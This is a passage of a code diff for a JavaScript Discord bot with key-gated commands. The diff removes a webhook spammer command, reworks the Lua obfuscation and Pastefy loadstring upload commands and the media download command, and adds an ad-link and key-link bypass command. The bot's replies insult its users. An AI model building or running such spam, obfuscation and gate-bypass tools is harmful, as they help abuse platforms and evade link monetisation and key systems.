-      replyUser(msg, "❌ Key saved but failed to assign role: " + e.message).catch(() => {});
-      return;
-    }
-    replyUser(msg, "✅ key redeemed successfully.").catch(() => {});
-    return;
-  }
-
-  // OWNER-ONLY DOT COMMANDS
   // ─────────────────────────────────────────────
   if (/^\.serverlist$/i.test(txt)) {
     if (!isOwner(msg.author.id)) { replyUser(msg, "❌ owner only, dumbass.").catch(() => {}); return; }
@@ -5248,45 +4625,6 @@ Key Active: ${activeKey ? "\`" + activeKey.key + "\`" : "❌ No active key."}`
   // ─────────────────────────────────────────────
   // ─────────────────────────────────────────────
   // ─────────────────────────────────────────────
-  // .whs — Webhook Spammer (with Start button + modal)
-  // ─────────────────────────────────────────────
-  if (/^\.whs(?:\s|$)/i.test(txt)) {
-    const perm = await checkRegularPermission(msg);
-    if (!perm.allowed) {
-      if (!perm.silent && perm.reason) replyUser(msg, perm.reason).catch(() => {}); return;
-    }
-    const cd = checkCommandCooldown(msg.author.id, "whs", perm.isBuyer);
-    if (cd.onCooldown) {
-      if (cd.noTokens) { replyNoTokens(msg, cd.waitUntil).catch(() => {}); return; }
-      replyUser(msg, `❌ you're on ${cd.remaining} cooldown.`).catch(() => {}); return;
-    }
-    
-    const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder()
-        .setCustomId("whs_start")
-        .setLabel("Start")
-        .setStyle(ButtonStyle.Success)
-    );
-    const v2 = {
-      flags: IS_COMPONENTS_V2,
-      components: [{
-        type: 17,
-        accent_color: RENAME_V2_ACCENT,
-        components: [
-          { type: 10, content: "Click **Start** below to send messages through your webhook." },
-          { type: 14, spacing: SEPARATOR_SPACING_SMALL },
-          row.toJSON()
-        ]
-      }]
-    };
-    const panelMsg = await replyComponentsV2(msg, v2, { mention: false }).catch(() => null);
-    if (panelMsg) {
-      whsPanelOwners.set(panelMsg.id, msg.author.id);
-      setTimeout(() => whsPanelOwners.delete(panelMsg.id), 10 * 60 * 1000);
-    }
-    return;
-  }
-
   // .upload — file → Pastefy loadstring (regular + buyer)
   // ─────────────────────────────────────────────
 
@@ -5312,8 +4650,17 @@ Key Active: ${activeKey ? "\`" + activeKey.key + "\`" : "❌ No active key."}`
     pendingTokenLine.delete(String(msg.author.id));
     const sentMsg = await sendUploadLoading(msg).catch(() => null);
     try {
-      const res = await fetch(file.url);
-      const content = await res.text();
+      let content = null;
+      for (const u of [...new Set([file.url, file.proxyURL, file.proxy_url].filter(Boolean))]) {
+        try {
+          const res = await fetch(u, { headers: { "User-Agent": "Mozilla/5.0" }, redirect: "follow" });
+          if (res.ok) {
+            content = await res.text();
+            if (content && content.trim()) break;
+          }
+        } catch {}
+      }
+      if (!content) throw new Error("could not read file from reply/attachment");
       const apiKey = process.env.PASTEFY_API_KEY;
       if (!apiKey) throw new Error("PASTEFY_API_KEY not set in env vars");
       // Try Pastefy API v2 with minimal fields
@@ -5393,8 +4740,17 @@ Key Active: ${activeKey ? "\`" + activeKey.key + "\`" : "❌ No active key."}`
     if (file.size > maxObfSize) { replyUser(msg, `❌ max is ${maxObfLabel} lol.`).catch(() => {}); return; }
     const sentMsg = await sendObfLoading(msg).catch(() => null);
     try {
-      const res = await fetch(file.url);
-      const source = await res.text();
+      let source = null;
+      for (const u of [...new Set([file.url, file.proxyURL, file.proxy_url].filter(Boolean))]) {
+        try {
+          const res = await fetch(u, { headers: { "User-Agent": "Mozilla/5.0" }, redirect: "follow" });
+          if (res.ok) {
+            source = await res.text();
+            if (source && source.trim()) break;
+          }
+        } catch {}
+      }
+      if (!source) throw new Error("could not read file from reply/attachment");
       // Obfuscate the script
       const obfuscated = obfuscateLua(source);
       // Upload obfuscated to Pastefy
@@ -5544,30 +4900,36 @@ Key Active: ${activeKey ? "\`" + activeKey.key + "\`" : "❌ No active key."}`
       return;
     }
     const file = attachments[0];
-    // Download file content NOW so button clicks never hit expired Discord CDN URLs
+    // Download file content — url + proxy (Components V2 reply support, same as .upload/.obf)
     let fileContent = null;
-    try {
-      const dlRes = await fetch(file.url);
-      if (!dlRes.ok) throw new Error(`HTTP ${dlRes.status}`);
-      fileContent = await dlRes.text();
-    } catch (dlErr) {
-      await sendRenameInputError(msg, "Couldn't read that file (link expired or invalid). Re-upload it and try again.");
-      return;
+    const tryUrls = [file.url, file.proxyURL, file.proxy_url].filter(Boolean);
+    for (const u of [...new Set(tryUrls)]) {
+      try {
+        const dlRes = await fetch(u, {
+          headers: { "User-Agent": "Mozilla/5.0", "Accept": "*/*" },
+          redirect: "follow"
+        });
+        if (dlRes.ok) {
+          fileContent = await dlRes.text();
+          if (fileContent && fileContent.trim().length >= 5) break;
+        }
+      } catch {}
     }
     if (!fileContent || fileContent.trim().length < 5) {
-      await sendRenameInputError(msg, "File is empty or too small.");
+      await sendRenameInputError(msg, "Couldn't read that file (link expired or invalid). Re-upload it and try again.");
       return;
     }
     if (isObfuscatedOrProtectionNotLua(fileContent)) {
       await sendRenameInputError(msg, "This is obfuscated or protection code, try another.");
       return;
     }
-    const fileExt = ext(file.name);
-    if (fileExt !== "lua" && fileExt !== "txt" && fileExt !== "luau") {
+    const fileExt = ext(file.name || file.filename || "");
+    // Allow missing extension when content is valid (V2 replies)
+    if (fileExt && fileExt !== "lua" && fileExt !== "txt" && fileExt !== "luau") {
       await sendRenameInputError(msg, "**Tips:**\n- Attach a .lua .txt or .luau file.\n- Reply to a message with a file, or forward message");
       return;
     }
-    
+
     // Process immediately — Components V2 loading
     const loadingMsg = await sendRenameLoading(msg).catch(() => null);
     const startTime = Date.now();
@@ -5657,7 +5019,7 @@ Key Active: ${activeKey ? "\`" + activeKey.key + "\`" : "❌ No active key."}`
     }
     return;
   }
-  // .dl / .download — gives file from library ID OR downloads from Discord CDN link
+  // .dl / .download — library ID, Discord CDN, TikTok, Instagram, direct links
   if (/^\.(?:dl|download)(?:\s|$)/i.test(txt)) {
     const perm = await checkRegularPermission(msg);
     if (!perm.allowed) {
@@ -5668,131 +5030,142 @@ Key Active: ${activeKey ? "\`" + activeKey.key + "\`" : "❌ No active key."}`
       if (cd.noTokens) { replyNoTokens(msg, cd.waitUntil).catch(() => {}); return; }
       replyUser(msg, `❌ you're on ${cd.remaining} cooldown.`).catch(() => {}); return;
     }
-    const arg = txt.split(/\s+/)[1];
-    if (!arg) { replyUser(msg, "❌ put file link, idiot.").catch(() => {}); return; }
+    const arg = (txt.split(/\s+/)[1] || "").trim();
+    if (!arg) { replyUser(msg, "❌ put file link or id, idiot.").catch(() => {}); return; }
     const isBuyerUser = perm.isBuyer;
     const startTime = Date.now();
+    const sentMsg = await replyUser(msg, "⏳ Processing...").catch(() => {});
 
-    // Check if Instagram URL
-    if (/instagram\.com|instagr\.am|ig\.me/i.test(arg)) {
-      const sentMsg = await replyUser(msg, "⏳ Processing...").catch(() => {});
-      try {
+    const finishSend = async (payload) => {
+      if (sentMsg) await sentMsg.delete().catch(() => {});
+      const elapsed = Date.now() - startTime;
+      const content = (payload.content ? payload.content + "\n" : "") + `**Finish in:** \`${elapsed}ms\``;
+      await msg.channel.send({ ...payload, content: `<@${msg.author.id}> **Here you go!**\n` + content }).catch(() => {});
+    };
+
+    try {
+      // TikTok
+      if (/tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com/i.test(arg)) {
+        const resolved = await resolveTikTokMedia(arg);
+        if (!resolved?.url) throw new Error("Failed to get TikTok video — try another link");
+        const attachment = await downloadAsAttachment(resolved.url, "tiktok.mp4");
+        if (attachment) {
+          await finishSend({ files: [attachment] });
+        } else {
+          await finishSend({
+            embeds: [new EmbedBuilder()
+              .setColor(getEmbedColor(isBuyerUser))
+              .setTitle("📥 TikTok Download")
+              .setDescription(`🔗 **Download:** [Click Here](${resolved.url})`)
+              .setFooter({ text: `Request by @${msg.author.username}│TikTok DL`, iconURL: msg.author.displayAvatarURL({ dynamic: true, size: 128 }) })]
+          });
+        }
+        return;
+      }
+
+      // Instagram
+      if (/instagram\.com|instagr\.am|ig\.me/i.test(arg)) {
         const resolved = await resolveCobaltMedia(arg);
         if (!resolved?.url) throw new Error("Failed to get Instagram media");
-        const mediaType = resolved.type || "Media";
         const attachment = await downloadAsAttachment(resolved.url, "instagram.mp4");
-        if (sentMsg) await sentMsg.delete().catch(() => {});
-        const elapsed = Date.now() - startTime;
         if (attachment) {
-          await msg.channel.send({
-            content: `<@${msg.author.id}> **Here you go bro!**\n**Type:** ${mediaType}\n**Finish in:** \`${elapsed}ms\``,
-            files: [attachment]
-          }).catch(() => {});
+          await finishSend({ content: `**Type:** ${resolved.type || "Media"}`, files: [attachment] });
         } else {
-          const resEmbed = new EmbedBuilder()
-            .setColor(getEmbedColor(isBuyerUser))
-            .setTitle("📥 Instagram Download")
-            .setDescription("**Type:** " + mediaType + "\n🔗 **Download:** [Click Here](" + resolved.url + ")")
-            .setFooter({ text: "Request by @" + msg.author.username + "│Instagram DL", iconURL: msg.author.displayAvatarURL({ dynamic: true, size: 128 }) });
-          await msg.channel.send({
-            content: `<@${msg.author.id}> **Here you go bro!**\n**Finish in:** \`${elapsed}ms\``,
-            embeds: [resEmbed]
-          }).catch(() => {});
+          await finishSend({
+            embeds: [new EmbedBuilder()
+              .setColor(getEmbedColor(isBuyerUser))
+              .setTitle("📥 Instagram Download")
+              .setDescription(`**Type:** ${resolved.type || "Media"}\n🔗 **Download:** [Click Here](${resolved.url})`)
+              .setFooter({ text: `Request by @${msg.author.username}│Instagram DL`, iconURL: msg.author.displayAvatarURL({ dynamic: true, size: 128 }) })]
+          });
         }
-      } catch (e) {
-        if (sentMsg) await sentMsg.delete().catch(() => {});
-        replyUser(msg, "❌ failed — link may be private, expired, or not a post/reel.").catch(() => {});
+        return;
       }
-      return;
-    }
 
-    // Check if TikTok URL — download file when possible
-    if (/tiktok\.com|vm\.tiktok\.com/i.test(arg)) {
-      const sentMsg = await replyUser(msg, "⏳ Processing...").catch(() => {});
-      try {
-        const resolved = await resolveTikTokMedia(arg);
-        if (!resolved?.url) throw new Error("Failed to get video — link may be private/region-locked, try another URL");
-        const attachment = await downloadAsAttachment(resolved.url, "tiktok.mp4");
-        if (sentMsg) await sentMsg.delete().catch(() => {});
-        const elapsed = Date.now() - startTime;
-        if (attachment) {
-          await msg.channel.send({
-            content: `<@${msg.author.id}> **Here you go bro!**\n**Finish in:** \`${elapsed}ms\``,
-            files: [attachment]
-          }).catch(() => {});
-        } else {
-          const resEmbed = new EmbedBuilder()
-            .setColor(getEmbedColor(isBuyerUser))
-            .setTitle("📥 TikTok Download")
-            .setDescription(`🔗 **Download:** [Click Here](${resolved.url})`)
-            .setFooter({ text: `Request by @${msg.author.username}│TikTok DL`, iconURL: msg.author.displayAvatarURL({ dynamic: true, size: 128 }) });
-          await msg.channel.send({
-            content: `<@${msg.author.id}> **Here you go bro!**\n**Finish in:** \`${elapsed}ms\``,
-            embeds: [resEmbed]
-          }).catch(() => {});
+      // Direct / Discord CDN URL
+      if (/^https?:\/\//i.test(arg) || /cdn\.discordapp\.com|media\.discordapp\.net/i.test(arg)) {
+        // Try cobalt for other social media first
+        if (/youtube\.com|youtu\.be|twitter\.com|x\.com|reddit\.com|facebook\.com|fb\.watch|pinterest\.com|threads\.net/i.test(arg)) {
+          const resolved = await resolveCobaltMedia(arg);
+          if (resolved?.url) {
+            const attachment = await downloadAsAttachment(resolved.url, "media.mp4");
+            if (attachment) {
+              await finishSend({ files: [attachment] });
+              return;
+            }
+            await finishSend({
+              embeds: [new EmbedBuilder()
+                .setColor(getEmbedColor(isBuyerUser))
+                .setTitle("📥 Media Download")
+                .setDescription(`🔗 **Download:** [Click Here](${resolved.url})`)]
+            });
+            return;
+          }
         }
-      } catch (e) {
-        if (sentMsg) await sentMsg.delete().catch(() => {});
-        replyUser(msg, `❌ failed: ${e.message.slice(0, 120)}`).catch(() => {});
-      }
-      return;
-    }
-
-    // Check if input is a URL
-    if (/^https?:\/\//i.test(arg) || /cdn\.discordapp\.com/i.test(arg) || /media\.discordapp\.net/i.test(arg)) {
-      const sentMsg = await replyUser(msg, "⏳ Processing...").catch(() => {});
-      try {
         const buf = await downloadURL(arg);
-        // Extract filename from URL
         let fileName = "file";
         const urlMatch = arg.match(/\/([^/?#]+)(?:\?|#|$)/);
         if (urlMatch) fileName = decodeURIComponent(urlMatch[1]);
-        const fileExt = ext(fileName);
-        if (!fileExt) fileName += ".txt";
-        const attachment = new AttachmentBuilder(buf, { name: fileName });
-        if (sentMsg) await sentMsg.delete().catch(() => {});
-        const elapsed = Date.now() - startTime;
-        await msg.channel.send({
-          content: `<@${msg.author.id}> **Here you go bro!**\n**Finish in:** \`${elapsed}ms\``,
-          files: [attachment]
-        }).catch(() => {});
-      } catch (e) {
-        if (sentMsg) await sentMsg.delete().catch(() => {});
-        replyUser(msg, `❌ error: ${e.message}`).catch(() => {});
+        if (!ext(fileName)) fileName += ".txt";
+        await finishSend({ files: [new AttachmentBuilder(buf, { name: fileName })] });
+        return;
       }
-      return;
-    }
 
-    // Otherwise treat as file ID from library
-    const file = getFile(arg);
-    if (!file) { replyUser(msg, "❌ your id is wrong, try find working id, dumbass.").catch(() => {}); return; }
-    if (!canGetLibraryFile(file, msg.author.id)) {
-      replyUser(msg, "❌ .zip files are owner only, dumbass.").catch(() => {});
-      return;
-    }
-    const sentMsg = await replyUser(msg, "⏳ Processing...").catch(() => {});
-    try {
+      // Library ID
+      const file = getFile(arg);
+      if (!file) throw new Error("wrong id — use `.find` for a working id");
+      if (!canGetLibraryFile(file, msg.author.id)) throw new Error(".zip files are owner only");
       const freshUrl = await getFreshUrl(file);
       const fileUrl = freshUrl || file.url;
       if (!fileUrl) throw new Error("file URL expired");
       let buf = null;
-      try {
-        buf = await downloadURL(fileUrl);
-      } catch {
+      try { buf = await downloadURL(fileUrl); } catch {
         const again = await getFreshUrl(file);
         if (again) buf = await downloadURL(again);
       }
-      if (!buf || !buf.length) throw new Error("could not download file");
-      const attachment = new AttachmentBuilder(buf, { name: file.filename || "file.lua" });
+      if (!buf?.length) throw new Error("could not download file");
+      await finishSend({ files: [new AttachmentBuilder(buf, { name: file.filename || "file.lua" })] });
+    } catch (e) {
       if (sentMsg) await sentMsg.delete().catch(() => {});
-      const elapsed = Date.now() - startTime;
+      replyUser(msg, `❌ failed: ${String(e.message || e).slice(0, 120)}`).catch(() => {});
+    }
+    return;
+  }
+
+  // .bypass — bypass ad/key links (linkvertise, lootlabs, work.ink, etc.)
+  if (/^\.bypass(?:\s|$)/i.test(txt)) {
+    const perm = await checkRegularPermission(msg);
+    if (!perm.allowed) {
+      if (!perm.silent && perm.reason) replyUser(msg, perm.reason).catch(() => {}); return;
+    }
+    const cd = checkCommandCooldown(msg.author.id, "bypass", perm.isBuyer);
+    if (cd.onCooldown) {
+      if (cd.noTokens) { replyNoTokens(msg, cd.waitUntil).catch(() => {}); return; }
+      replyUser(msg, `❌ you're on ${cd.remaining} cooldown.`).catch(() => {}); return;
+    }
+    const arg = (txt.split(/\s+/)[1] || "").trim();
+    if (!arg || !/^https?:\/\//i.test(arg)) {
+      replyUser(msg, "❌ usage: `.bypass <ad_or_key_link>`").catch(() => {});
+      return;
+    }
+    const isBuyerUser = perm.isBuyer;
+    const sentMsg = await replyUser(msg, "⏳ Bypassing...").catch(() => {});
+    try {
+      const result = await bypassAdLink(arg);
+      if (!result?.url) throw new Error("could not bypass this link");
+      if (sentMsg) await sentMsg.delete().catch(() => {});
+      const embed = new EmbedBuilder()
+        .setColor(getEmbedColor(isBuyerUser))
+        .setTitle("🔓 Bypass Result")
+        .setDescription(`**Original:** ${arg.slice(0, 200)}\n**Bypassed:** [Open Link](${result.url})\n\`\`\`\n${result.url}\n\`\`\``)
+        .setFooter({ text: `Request by @${msg.author.username}│Bypass`, iconURL: msg.author.displayAvatarURL({ dynamic: true, size: 128 }) });
       await msg.channel.send({
-        content: `<@${msg.author.id}> **Here you go!**\n**Finish in:** \`${elapsed}ms\``,
-        files: [attachment]
+        content: `<@${msg.author.id}> **Here you go!**`,
+        embeds: [embed]
       }).catch(() => {});
     } catch (e) {
       if (sentMsg) await sentMsg.delete().catch(() => {});
-      replyUser(msg, `❌ failed: ${e.message.slice(0, 100)}`).catch(() => {});
+      replyUser(msg, `❌ bypass failed: ${String(e.message || e).slice(0, 100)}`).catch(() => {});
     }
     return;
   }
